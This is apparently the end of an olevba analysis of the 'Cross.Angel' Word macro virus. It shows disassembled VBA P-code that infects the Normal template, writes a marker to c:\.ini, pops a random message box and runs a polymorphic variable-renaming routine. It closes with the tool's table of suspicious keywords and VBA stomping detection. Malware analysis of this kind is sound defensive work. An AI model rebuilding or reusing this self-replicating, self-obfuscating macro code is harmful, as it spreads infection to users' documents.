' 	Ld ÈÅ”›² 
' 	MemLd NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #107:
' 	Ld ª¾±³· 
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0004 "Word"
' 	Ld ÈÅ”›² 
' 	MemLd System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	EndWith 
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	Ld ˆŽ£È« 
' 	Ld ª¾±³· 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ÈÅ”›² 
' 	ArgsMemCall Quit 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x003C 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x002C "Why I lost my angel? Can't live without you!"
' 	Ld vbQuestion 
' 	LitStr 0x0020 "Cross.Angel by jackie-/Lz0NT/MVT"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' 	EndIf 
' Line #112:
' 	EndSub 
' Line #113:
' 	FuncDefn (Private Function ½‘ˆ²†(È¹Ž±¦, id_FFFE As Variant))
' 	QuoteRem 0x001E 0x0009 "JSMP v1.2"
' Line #114:
' 	Dim 
' 	LitDI2 0x0000 
' 	LitDI2 0x0014 
' 	VarDefn £µŠ‰œ
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' Line #115:
' 	LitDI2 0x0001 
' 	St ¨¸¸‘Š 
' 	BoS 0x0000 
' 	LitStr 0x0005 "È¹Ž±¦"
' 	LitDI2 0x0000 
' 	ArgsSt £µŠ‰œ 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "½‘ˆ²†"
' 	LitDI2 0x0001 
' 	ArgsSt £µŠ‰œ 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "£µŠ‰œ"
' 	LitDI2 0x0002 
' 	ArgsSt £µŠ‰œ 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "Š¸¾¯˜"
' 	LitDI2 0x0003 
' 	ArgsSt £µŠ‰œ 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "£…†Ã�"
' 	LitDI2 0x0004 
' 	ArgsSt £µŠ‰œ 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "¨¸¸‘Š"
' 	LitDI2 0x0005 
' 	ArgsSt £µŠ‰œ 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "ž»§–Ê"
' 	LitDI2 0x0006 
' 	ArgsSt £µŠ‰œ 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "…·µ¶Š"
' 	LitDI2 0x0007 
' 	ArgsSt £µŠ‰œ 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "‡š…©®"
' 	LitDI2 0x0008 
' 	ArgsSt £µŠ‰œ 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "ª’¼¹®"
' 	LitDI2 0x0009 
' 	ArgsSt £µŠ‰œ 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "»–Šš¦"
' 	LitDI2 0x000A 
' 	ArgsSt £µŠ‰œ 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "µžŠª¯"
' 	LitDI2 0x000B 
' 	ArgsSt £µŠ‰œ 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "¸‡Â”“"
' 	LitDI2 0x000C 
' 	ArgsSt £µŠ‰œ 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "ª¾±³·"
' 	LitDI2 0x000D 
' 	ArgsSt £µŠ‰œ 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "„Â©¶°"
' 	LitDI2 0x000E 
' 	ArgsSt £µŠ‰œ 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "·˜¯¨¦"
' 	LitDI2 0x000F 
' 	ArgsSt £µŠ‰œ 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "È‡‰ƒ·"
' 	LitDI2 0x0010 
' 	ArgsSt £µŠ‰œ 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "ÈŽ‡Œ”"
' 	LitDI2 0x0011 
' 	ArgsSt £µŠ‰œ 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "ÈÅ”›²"
' 	LitDI2 0x0012 
' 	ArgsSt £µŠ‰œ 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "ˆŽ£È«"
' 	LitDI2 0x0013 
' 	ArgsSt £µŠ‰œ 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "À˜Êƒˆ"
' 	LitDI2 0x0014 
' 	ArgsSt £µŠ‰œ 0x0001 
' Line #116:
' 	StartForVariable 
' 	Ld Š¸¾¯˜ 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0014 
' 	For 
' Line #117:
' 	LitDI2 0x0082 
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0082 
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0082 
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0082 
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0082 
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St £…†Ã� 
' Line #118:
' 	Do 
' Line #119:
' 	Ld ¨¸¸‘Š 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld È¹Ž±¦ 
' 	Ld Š¸¾¯˜ 
' 	ArgsLd £µŠ‰œ 0x0001 
' 	FnInStr3 
' 	St ¨¸¸‘Š 
' Line #120:
' 	Ld ¨¸¸‘Š 
' 	If 
' 	BoSImplicit 
' 	Ld È¹Ž±¦ 
' 	LitDI2 0x0001 
' 	Ld ¨¸¸‘Š 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	ArgsLd Mid$ 0x0003 
' 	Ld £…†Ã� 
' 	Concat 
' 	Ld È¹Ž±¦ 
' 	Ld ¨¸¸‘Š 
' 	Ld Š¸¾¯˜ 
' 	ArgsLd £µŠ‰œ 0x0001 
' 	FnLen 
' 	Add 
' 	Paren 
' 	Ld È¹Ž±¦ 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St È¹Ž±¦ 
' 	EndIf 
' Line #121:
' 	Ld ¨¸¸‘Š 
' 	LoopWhile 
' Line #122:
' 	StartForVariable 
' 	Next 
' Line #123:
' 	Ld È¹Ž±¦ 
' 	St ½‘ˆ²† 
' Line #124:
' 	EndFunc 
' Line #125:
' 	QuoteRem 0x0000 0x0033 "Cross.Angel written by jackie twoflower /Lz0NT /MVT"
' Line #126:
' 	QuoteRem 0x0000 0x0024 "Uses Jackie's Stupid Macro Poly v1.2"
' Line #127:
' 	QuoteRem 0x0000 0x0034 "Office97 and Office2000 compatible | New Cross area!"
' Line #128:
' 	QuoteRem 0x0000 0x002F "Hey my angel, this is for you. Why you left me?"
' Line #129:
' 	QuoteRem 0x0000 0x0023 "I can't live without you! I luv ya!"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

